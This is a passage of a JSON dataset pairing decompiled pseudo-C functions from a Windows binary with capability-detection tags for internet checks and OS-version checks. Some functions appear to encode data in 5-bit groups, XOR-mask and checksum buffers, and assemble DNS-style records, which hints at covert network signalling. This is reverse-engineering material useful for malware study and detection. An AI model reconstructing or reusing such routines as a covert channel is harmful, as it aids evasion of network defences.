        "decompiled_code": "\nuint __cdecl fcn.00068b50(uint noname_0, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (*(arg_ch + 0x18) == 0) {\n        iVar1 = fcn.00073af0(*(arg_10h + 0x14), *(arg_ch + 0x1c), *(arg_10h + 0x10) + 0x120, arg_10h);\n        if (iVar1 == 0) {\n            *(arg_10h + 0x14) = 0;\n        }\n    }\n    if (*(arg_10h + 0x14) != 0) {\n        fcn.000357f0(*(arg_10h + 0x14));\n    }\n    fcn.000357f0(arg_10h);\n    (**0x800512a4)(*(arg_ch + 4));\n    (**0x8005126c)(arg_ch);\n    return 0xc0000016;\n}\n",
        "token_count": 237
    },
    "00068be0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00068be0(int32_t arg_8h, int32_t arg_ch, uchar *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    var_18h = 0;\n    var_ch = 0;\n    *arg_10h = 0;\n    for (var_14h = 0; var_14h < arg_ch; var_14h = var_14h + 1) {\n        iVar1 = fcn.00078a44(0x80051a7c, *(arg_8h + var_14h));\n        if (iVar1 != 0) {\n            var_5h = iVar1 + 0x84;\n            if (0x1f < var_5h) {\n                var_5h = 0x1f;\n            }\n            for (var_10h = 0; var_10h < 5; var_10h = var_10h + 1) {\n                arg_10h[var_18h] =\n                     arg_10h[var_18h] | ((var_5h & 1 << (var_10h & 0x1f)) >> (var_10h & 0x1f)) << (var_ch & 0x1f);\n                var_ch = var_ch + 1;\n                if ((7 < var_ch) && (var_ch = 0,  var_14h < arg_ch + -1)) {\n                    var_18h = var_18h + 1;\n                    arg_10h[var_18h] = 0;\n                }\n            }\n        }\n    }\n    return var_18h + 1;\n}\n",
        "token_count": 421
    },
    "00068ce0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00068ce0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    for (var_4h = 0; var_4h < arg_ch << 3; var_4h = var_4h + 1) {\n        var_8h = ((*(arg_8h + (var_4h >> 3)) & 1 << var_4h % 8) >> var_4h % 8) << var_4h % 0x1c | var_8h;\n        if (var_4h % 0x1c == 0x1b) {\n            *(arg_10h + var_ch * 4) = var_ch << 0x1c | var_8h;\n            var_ch = var_ch + 1;\n            var_8h = 0;\n        }\n    }\n    if (var_4h % 0x1c != 0x1b) {\n        for (; var_4h % 0x1c != 0x1b; var_4h = var_4h + 1) {\n            uVar1 = fcn.00078a6e();\n            uVar1 = uVar1 & 0x80000001;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n            }\n            if (uVar1 == 1) {\n                var_8h = 1 << var_4h % 0x1c | var_8h;\n            }\n        }\n        *(arg_10h + var_ch * 4) = var_ch << 0x1c | var_8h;\n        var_ch = var_ch + 1;\n    }\n    return var_ch;\n}\n",
        "token_count": 460
    },
    "00068e20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00068e20(int32_t arg_8h, uint32_t arg_ch, uint32_t *arg_10h, int32_t arg_14h, uint *arg_18h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    uint32_t arg_8h_00;\n    uint32_t in_EDX;\n    uint32_t uVar3;\n    ushort extraout_var;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint8_t uStack72;\n    uchar auStack71 [23];\n    uint16_t *var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint8_t *var_20h;\n    uint32_t var_1ch;\n    uint8_t var_15h;\n    int32_t var_14h;\n    uint var_10h;\n    uint8_t var_9h;\n    uint16_t *var_8h;\n    uint32_t var_4h;\n    \n    if ((arg_ch < 0xc) || (0x200 < arg_ch)) {\n        uVar2 = 0;\n    }\n    else {\n        var_14h = arg_8h;\n        if (*(arg_8h + 2) < '\\0') {\n            uVar2 = 0;\n        }\n        else if ((*(arg_8h + 2) >> 3 & 0xf) == 0) {\n            iVar1 = fcn.00035980(in_EDX & 0xffff0000 | *(arg_8h + 4));\n            if (iVar1 == 1) {\n                var_20h = var_14h + 0xc;\n                if (arg_ch == 0xc) {\n                    uVar2 = 0;\n                }\n                else {\n                    uVar3 = *var_20h;\n                    arg_8h_00 = var_14h + 0xd;\n                    var_28h = arg_ch - 0xd;\n                    if (uVar3 == 0) {\n                        uVar2 = 0;\n                    }\n                    else {\n                        var_2ch = arg_8h_00;\n                        if (((arg_18h == NULL) || (uVar3 != 10)) ||\n                           (arg_8h_00 = fcn.00037ea0(arg_8h_00),  arg_8h_00 == 0)) {\n                            if ((uVar3 < 8) || (0x2d < uVar3)) {\n                                uVar2 = 0;\n                            }\n                            else if (uVar3 < var_28h) {\n                                var_1ch = 0;\n                                while (var_1ch < uVar3) {\n                                    if ((((var_1ch == 8) || (var_1ch == 0xd)) ||\n                                        ((var_1ch == 0x12 || (var_1ch == 0x17)))) && (var_1ch < uVar3 - 1)) {\n                                        if (*(var_2ch + var_1ch) != '-') {\n                                            return 0;\n                                        }\n                                    }\n                                    else if (((*(var_2ch + var_1ch) < 0x30) || (0x39 < *(var_2ch + var_1ch))) &&\n                                            ((*(var_2ch + var_1ch) < 0x61 || (0x7a < *(var_2ch + var_1ch))))) {\n                                        return 0;\n                                    }\n                                    arg_8h_00 = var_1ch + 1;\n                                    var_1ch = arg_8h_00;\n                                }\n                                var_2ch = var_2ch + uVar3;\n                                var_28h = var_28h - uVar3;\n                                while (var_28h != 0) {\n                                    uVar3 = *var_2ch;\n                                    var_2ch = var_2ch + 1;\n                                    arg_8h_00 = var_28h - 1;\n                                    if (arg_8h_00 <= uVar3) {\n                                        return 0;\n                                    }\n                                    var_28h = arg_8h_00;\n                                    if (uVar3 == 0) break;\n                                    var_2ch = var_2ch + uVar3;\n                                    arg_8h_00 = arg_8h_00 - uVar3;\n                                    var_28h = arg_8h_00;\n                                }\n                                if (var_28h < 4) {\n                                    uVar2 = 0;\n                                }\n                                else {\n                                    var_8h = var_2ch;\n                                    var_24h._0_2_ = fcn.00035980(arg_8h_00 & 0xffff0000 | *var_2ch);\n                                    var_10h._0_2_ = fcn.00035980(CONCAT22(extraout_var, var_8h[1]));\n                                    if (var_24h == 1) {\n                                        if (var_10h == 1) {\n                                            var_4h = fcn.00068be0(var_20h + 1, *var_20h, &var_48h);\n                                            if (var_4h < 5) {\n                                                uVar2 = 0;\n                                            }\n                                            else {\n                                                var_9h = var_48h._2_1_;\n                                                for (var_1ch = 0; var_1ch < var_4h; var_1ch = var_1ch + 1) {\n                                                    *(&var_48h + var_1ch) = *(&var_48h + var_1ch) ^ var_9h >> 1;\n                                                }\n                                                var_48h = var_48h & 0xff00ffff;\n                                                var_15h = 0;\n                                                for (var_1ch = 0; var_1ch < var_4h; var_1ch = var_1ch + 1) {\n                                                    var_15h = var_15h + *(&var_48h + var_1ch);\n                                                }\n                                                if (var_9h == var_15h) {\n                                                    if ((uStack72 & 0x1f) < 0x1a) {\n                                                        *arg_10h = var_48h;\n                                                        *(arg_10h + 1) = uStack72;\n                                                        if (arg_14h != 0) {\n                                                            fcn.00078be8(arg_14h, auStack71, uStack72 & 0x1f);\n                                                        }\n                                                        if (arg_18h != NULL) {\n                                                            *arg_18h = 0;\n                                                        }\n                                                        uVar2 = 1;\n                                                    }\n                                                    else {\n                                                        uVar2 = 0;\n                                                    }\n                                                }\n                                                else {\n                                                    uVar2 = 0;\n                                                }\n                                            }\n                                        }\n                                        else {\n                                            uVar2 = 0;\n                                        }\n                                    }\n                                    else {\n                                        uVar2 = 0;\n                                    }\n                                }\n                            }\n                            else {\n                                uVar2 = 0;\n                            }\n                        }\n                        else {\n                            *arg_18h = 1;\n                            fcn.00078be8(arg_14h, var_2ch, 10);\n                            *(arg_14h + 10) = 0;\n                            uVar2 = 1;\n                        }\n                    }\n                }\n            }\n            else {\n                uVar2 = 0;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 1673
    },
    "000691b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Heritage AFTER dead removal. Example location: s0xffffff8c : 0x00069200\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl\nfcn.000691b0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h, int32_t arg_18h, uint32_t arg_1ch, \n            int32_t *arg_20h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint8_t *var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint8_t uStack116;\n    uchar auStack115 [31];\n    uint8_t *var_50h;\n    uint8_t var_49h;\n    uint32_t var_48h;\n    uint var_44h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint8_t var_ah;\n    uint8_t var_9h;\n    uint32_t var_8h;\n    uint *var_4h;\n    \n    if (arg_14h < 0x1d) {\n        iVar3 = fcn.00068e20(arg_8h, arg_ch, &var_14h, 0, 0);\n        if (iVar3 == 0) {\n            uVar2 = 0;\n        }\n        else {\n            var_74h = var_14h;\n            uStack116 = var_10h & 0x80 | arg_14h & 0x1f | (arg_18h != 0) << 5;\n    // WARNING: Ignoring partial resolution of indirect\n            var_74h._2_1_ = 0;\n            fcn.00078be8(auStack115, arg_10h, arg_14h);\n            var_8h = arg_14h + 5;\n            var_9h = 0;\n            for (var_1ch = 0; var_1ch < arg_14h + 5; var_1ch = var_1ch + 1) {\n                var_9h = var_9h + *(&var_74h + var_1ch);\n            }\n            for (var_1ch = 0; var_1ch < var_8h; var_1ch = var_1ch + 1) {\n                *(&var_74h + var_1ch) = *(&var_74h + var_1ch) ^ var_9h >> 1;\n            }\n            var_48h = fcn.00068ce0(&var_74h, var_8h, &var_44h);\n            var_49h = *(arg_8h + 0xc);\n            if (var_49h == 0) {\n                uVar2 = 0;\n            }\n            else {\n                var_50h = var_49h + arg_8h + 0xd;\n                for (var_7ch = var_50h; *var_7ch != 0; var_7ch = var_7ch + *var_7ch + 1) {\n                }\n                var_7ch = var_7ch + (5 - arg_8h);\n                if (var_7ch < 0x81) {\n                    fcn.00078be8(arg_1ch, arg_8h, var_7ch);\n                    var_18h = arg_1ch;\n                    *(arg_1ch + 2) = *(arg_1ch + 2) | 0x80;\n                    *(arg_1ch + 3) = *(arg_1ch + 3) | 0x80;\n                    *(arg_1ch + 2) = *(arg_1ch + 2) | 4;\n                    *(arg_1ch + 3) = *(arg_1ch + 3) & 0xf0;\n                    uVar1 = fcn.00035980(arg_1ch & 0xffff0000 | var_48h & 0xffff);\n                    *(var_18h + 6) = uVar1;\n                    *(var_18h + 8) = 0;\n                    *(var_18h + 10) = 0;\n                    var_4h = var_7ch + arg_1ch;\n                    var_ah = 0xc;\n                    for (var_1ch = 0; var_1ch < var_48h; var_1ch = var_1ch + 1) {\n                        *var_4h = 0xc0;\n                        *(var_4h + 1) = var_ah;\n                        var_4h = var_4h + 2;\n                        uVar1 = fcn.00035980(1);\n                        *var_4h = uVar1;\n                        var_4h = var_4h + 2;\n                        uVar1 = fcn.00035980(1);\n                        *var_4h = uVar1;\n                        var_4h = var_4h + 2;\n                        uVar2 = fcn.00035950(0x3c);\n                        *var_4h = uVar2;\n                        var_4h = var_4h + 1;\n                        uVar1 = fcn.00035980(4);\n                        *var_4h = uVar1;\n                        var_4h = var_4h + 2;\n                        *var_4h = (&var_44h)[var_1ch];\n                        uVar2 = fcn.00035950((&var_44h)[var_1ch]);\n                        *var_4h = uVar2;\n                        var_4h = var_4h + 1;\n                    }\n                    *arg_20h = var_4h - arg_1ch;\n                    uVar2 = 1;\n                }\n                else {\n                    uVar2 = 0;\n                }\n            }\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 1371
    },
    "00069520": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00069520(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    if (*(arg_8h + 0xc) == 0) {\n        fcn.000766e0(*(arg_8h + 0x14), arg_ch, arg_10h);\n    }\n    else {\n        (**(arg_8h + 0xc))(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "000695f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000695f0(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t arg_10h_00;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = fcn.000356c0(0x168);\n    if (arg_10h_00 == 0) {\n        var_10h = 0x21590004;\n    }\n    else {\n        fcn.00078bfa(arg_10h_00, 0, 0x168);\n        *(arg_10h_00 + 4) = 0x800a9860;\n        *(arg_10h_00 + 8) = 0x800a97f0;\n        *(arg_10h_00 + 0xc) = 0x800aa230;\n        *(arg_10h_00 + 0x10) = 0x800aa320;\n        var_ch = 0;\n        if ((arg_18h & 1) != 0) {\n            var_ch = 2;\n        }\n        var_8h = arg_ch;\n        var_4h = 0;\n        var_10h = fcn.00075eb0(arg_10h_00 + 0x14, &var_8h, 0, 0, arg_10h, arg_14h, var_ch);\n        if (var_10h == 0) {\n            uVar1 = fcn.00035820(arg_ch);\n            *(arg_10h_00 + 0x34) = uVar1;\n            if (*(arg_10h_00 + 0x34) == 0) {\n                var_10h = 0x21590004;\n            }\n            else {\n                uVar1 = fcn.000356c0(arg_14h);\n                *(arg_10h_00 + 0x30) = uVar1;\n                if (*(arg_10h_00 + 0x30) == 0) {\n                    var_10h = 0x21590004;\n                }\n                else {\n                    fcn.00078be8(*(arg_10h_00 + 0x30), arg_10h, arg_14h);\n                    *(arg_10h_00 + 0x38) = arg_14h;\n                    *(arg_10h_00 + 0x3c) = var_ch;\n                    iVar2 = fcn.000344b0(arg_10h_00 + 0x50);\n                    if (iVar2 == 0) {\n                        var_10h = fcn.00035ae0();\n                    }\n                    else {\n                        iVar2 = fcn.0001ace0(arg_10h_00 + 0x48, 0x800aa9c0, arg_10h_00);\n                        if (iVar2 == 0) {\n                            fcn.000349b0(arg_10h_00 + 0x44);\n                            fcn.00036ed0(arg_10h_00 + 0x1c);\n                            *arg_8h = arg_10h_00;\n                            var_10h = 0;\n                        }\n                        else {\n                            var_10h = fcn.00035ae0();\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if ((var_10h != 0) && (arg_10h_00 != 0)) {\n        iVar2 = fcn.00037730(arg_10h_00 + 0x50);\n        if (iVar2 != 0) {\n            fcn.00034540(arg_10h_00 + 0x50);\n        }\n        fcn.000357f0(*(arg_10h_00 + 0x34));\n        fcn.000357f0(*(arg_10h_00 + 0x30));\n        fcn.000761d0(arg_10h_00 + 0x14, 0);\n        fcn.000357f0(arg_10h_00);\n    }\n    return var_10h;\n}\n",
        "token_count": 958
    },
    "000697f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.000697f0(int32_t arg_8h)\n\n{\n    uint *var_4h;\n    \n    fcn.00036f70(arg_8h + 0x1c);\n    for (var_4h = *(arg_8h + 0x18); var_4h != NULL; var_4h = *var_4h) {\n        fcn.000761d0(var_4h + 2, 0);\n    }\n    fcn.00037020(arg_8h + 0x1c);\n    if (*(arg_8h + 0x15c) != 0) {\n        fcn.000761d0(arg_8h + 0x160, 0);\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00069860": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00069860(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    var_8h = *(arg_8h + 0x40);\n    while (var_8h != NULL) {\n        puVar1 = *var_8h;\n        fcn.000357f0(var_8h);\n        var_8h = puVar1;\n    }\n    var_4h = *(arg_8h + 0x18);\n    while (var_4h != NULL) {\n        puVar1 = *var_4h;\n        fcn.000357f0(var_4h);\n        var_4h = puVar1;\n    }\n    iVar2 = fcn.00037730(arg_8h + 0x48);\n    if (iVar2 != 0) {\n        fcn.00034570(arg_8h + 0x50);\n        fcn.00037760(arg_8h + 0x48, 0);\n        fcn.00034540(arg_8h + 0x50);\n        fcn.00037710(arg_8h + 0x48);\n    }\n    fcn.00034a10(arg_8h + 0x44);\n    if (*(arg_8h + 0x15c) == 0) {\n        while (*(arg_8h + 0x158) != *(arg_8h + 0x154)) {\n            uVar3 = *(arg_8h + 0x158) & 0x8000001f;\n            if (uVar3 < 0) {\n                uVar3 = (uVar3 - 1 | 0xffffffe0) + 1;\n            }\n            *(arg_8h + 0x158) = uVar3;\n            fcn.000761d0(arg_8h + 0x54 + *(arg_8h + 0x158) * 8, 0);\n            uVar3 = *(arg_8h + 0x158) + 1U & 0x8000001f;\n            if (uVar3 < 0) {\n                uVar3 = (uVar3 - 1 | 0xffffffe0) + 1;\n            }\n            *(arg_8h + 0x158) = uVar3;\n        }\n    }\n    else {\n        fcn.000761d0(arg_8h + 0x160, 0);\n    }\n    fcn.000357f0(*(arg_8h + 0x34));\n    fcn.000357f0(*(arg_8h + 0x30));\n    fcn.00034a80(arg_8h + 0x44);\n    fcn.000349e0(arg_8h + 0x44);\n    fcn.000761d0(arg_8h + 0x14, 0);\n    fcn.00036f40(arg_8h + 0x1c);\n    fcn.000357f0(arg_8h);\n    return;\n}\n",
        "token_count": 721
    },
    "00069a50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00069a50(uint arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h, int32_t *arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    uint *puVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_18h = fcn.0006a670(arg_8h, &var_4h, 0);\n    if (var_18h == 0) {\n        var_24h = 0;\n        var_20h = arg_ch;\n        var_1ch = 1;\n        fcn.000270a0(&var_24h);\n        var_8h = 0;\n        var_ch = 0xc;\n        var_10h = &var_24h;\n        var_14h = arg_10h;\n        var_18h = fcn.00076de0(var_4h, &var_14h, arg_18h, arg_1ch, arg_20h, 0);\n        if (var_18h == 0) {\n            if (*arg_1ch < 0xc) {\n                fcn.00076a80(var_4h, *arg_18h);\n                *arg_18h = 0;\n                *arg_1ch = 0;\n                var_18h = 0x2159000a;\n            }\n            else {\n                puVar1 = *arg_18h;\n                var_24h = *puVar1;\n                var_20h = puVar1[1];\n                var_1ch = puVar1[2];\n                fcn.000270a0(&var_24h);\n                if (var_1ch == '\\x02') {\n                    *arg_14h = var_20h;\n                    *arg_1ch = *arg_1ch - 0xc;\n                    if (*arg_1ch < 1) {\n                        fcn.00076a80(var_4h, *arg_18h);\n                        *arg_18h = 0;\n                        *arg_1ch = 0;\n                    }\n                    else {\n                        *arg_18h = *arg_18h + 0xc;\n                        *(*arg_18h + -0xc) = var_4h;\n                    }\n                    var_18h = 0;\n                }\n                else {\n                    fcn.00076a80(var_4h, *arg_18h);\n                    *arg_18h = 0;\n                    *arg_1ch = 0;\n                    var_18h = 0x2159000a;\n                }\n            }\n        }\n    }\n    fcn.0006a8c0(arg_8h, &var_4h, var_18h == 0);\n    return var_18h;\n}\n",
        "token_count": 703
    },
    "00069c30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00069c30(uint arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h, uint32_t arg_18h)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0;\n    var_4h = 0;\n    while ((var_4h < 5 && (var_24h = fcn.0006a3f0(arg_8h, &var_8h, arg_14h),  var_24h == 0))) {\n        while (var_24h = fcn.00076860(var_8h, &var_ch, &var_10h, 0, 0),  var_24h == 0) {\n            fcn.00076a80(var_8h, var_ch);\n        }\n        if (var_24h == 0x21590002) {\n            var_30h = *arg_14h;\n            var_2ch = arg_ch;\n            var_28h = (arg_18h & 1) != 0;\n            fcn.000270a0(&var_30h);\n            var_14h = 0;\n            var_18h = 0xc;\n            var_1ch = &var_30h;\n            var_20h = arg_10h;\n            var_24h = fcn.00076cb0(var_8h, &var_20h, 0);\n            if (var_24h == 0) {\n                return 0;\n            }\n            fcn.0006a5a0(arg_8h, *arg_14h, 0);\n            *arg_14h = 0;\n        }\n        else {\n            fcn.0006a5a0(arg_8h, *arg_14h, 0);\n        }\n        var_4h = var_4h + 1;\n    }\n    return var_24h;\n}\n",
        "token_count": 515
    },
    "00069da0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00069da0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_1ch = 0;\n    var_20h = arg_ch;\n    var_18h = 3;\n    fcn.000270a0(&var_20h);\n    var_8h = 0;\n    var_ch = 0xc;\n    var_10h = &var_20h;\n    var_14h = arg_10h;\n    var_4h = fcn.0006a530(arg_8h, arg_ch);\n    if (var_4h == 0) {\n        uVar1 = 0x21590006;\n    }\n    else {\n        uVar1 = fcn.00076cb0(var_4h, &var_14h, 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 258
    },
    "00069e20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00069e20(uint arg_8h, int32_t arg_ch, int32_t **arg_10h, uint32_t *arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.0006a530(arg_8h, arg_ch);\n    if (var_4h == 0) {\n        var_8h = 0x21590006;\n    }\n    else {\n        while (var_8h = fcn.00076860(var_4h, arg_10h, arg_14h, arg_18h, 0),  var_8h == 0) {\n            if (*arg_14h < 0xc) {\n                fcn.00076a80(var_4h, *arg_10h);\n                *arg_10h = NULL;\n                *arg_14h = 0;\n                fcn.0006a5a0(arg_8h, arg_ch, 0);\n                return 0x2159000a;\n            }\n            piVar1 = *arg_10h;\n            var_14h = *piVar1;\n            var_10h = piVar1[1];\n            var_ch = piVar1[2];\n            fcn.000270a0(&var_14h);\n            if (var_ch != '\\x06') {\n                if ((var_14h == arg_ch) && ((var_ch == '\\x02' || (var_ch == '\\x03')))) {\n                    if (var_ch == '\\x02') {\n                        iVar2 = fcn.0006ab00(arg_8h, arg_ch, *arg_10h, *arg_14h);\n                        if (iVar2 == 0) {\n                            fcn.00076a80(var_4h, *arg_10h);\n                        }\n                        *arg_10h = NULL;\n                        *arg_14h = 0;\n                        return 0x21590006;\n                    }\n                    *arg_14h = *arg_14h - 0xc;\n                    if (*arg_14h < 1) {\n                        fcn.00076a80(var_4h, *arg_10h);\n                        *arg_10h = NULL;\n                        *arg_14h = 0;\n                    }\n                    else {\n                        *arg_10h = *arg_10h + 3;\n                        (*arg_10h)[-3] = var_4h;\n                    }\n                    return 0;\n                }\n                fcn.00076a80(var_4h, *arg_10h);\n                *arg_10h = NULL;\n                *arg_14h = 0;\n                fcn.0006a5a0(arg_8h, arg_ch, 0);\n                return 0x2159000a;\n            }\n            fcn.00076a80(var_4h, *arg_10h);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 719
    },
    "00069ff0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00069ff0(uint arg_8h, int32_t arg_ch, int32_t *arg_10h, int32_t **arg_14h, uint32_t *arg_18h, uint arg_1ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = NULL;\n    *arg_18h = 0;\n    iVar2 = fcn.0006ab80(arg_8h, arg_ch, arg_14h, arg_18h, &var_4h);\n    if (iVar2 == 0) {\n        var_4h = fcn.0006a530(arg_8h, arg_ch);\n        if (var_4h == 0) {\n            return 0x21590006;\n        }\n        while (var_8h = fcn.00076860(var_4h, arg_14h, arg_18h, arg_1ch, 0),  var_8h == 0) {\n            if (*arg_18h < 0xc) {\n                var_8h = 0x2159000a;\n                break;\n            }\n            piVar1 = *arg_14h;\n            var_14h = *piVar1;\n            var_10h = piVar1[1];\n            var_ch = piVar1[2];\n            fcn.000270a0(&var_14h);\n            if (var_ch == '\\x06') {\n                fcn.00076a80(var_4h, *arg_14h);\n            }\n            else {\n                if ((var_ch == '\\x02') && (var_14h == arg_ch)) goto code_r0x0006a125;\n                if ((var_ch != '\\x03') || (var_14h != arg_ch)) {\n                    var_8h = 0x2159000a;\n                    break;\n                }\n                fcn.00076a80(var_4h, *arg_14h);\n            }\n        }\n    }\n    else {\n        piVar1 = *arg_14h;\n        var_14h = *piVar1;\n        var_10h = piVar1[1];\n        var_ch = piVar1[2];\n        fcn.000270a0(&var_14h);\ncode_r0x0006a125:\n        *arg_10h = var_10h;\n        *arg_18h = *arg_18h - 0xc;\n        if (*arg_18h < 1) {\n            fcn.00076a80(var_4h, *arg_14h);\n            *arg_14h = NULL;\n            *arg_18h = 0;\n        }\n        else {\n            *arg_14h = *arg_14h + 3;\n            (*arg_14h)[-3] = var_4h;\n        }\n        var_8h = 0;\n    }\n    if ((var_8h != 0) && (*arg_14h != NULL)) {\n        fcn.00076a80(var_4h, *arg_14h);\n        *arg_14h = NULL;\n        *arg_18h = 0;\n    }\n    fcn.0006a5a0(arg_8h, arg_ch, 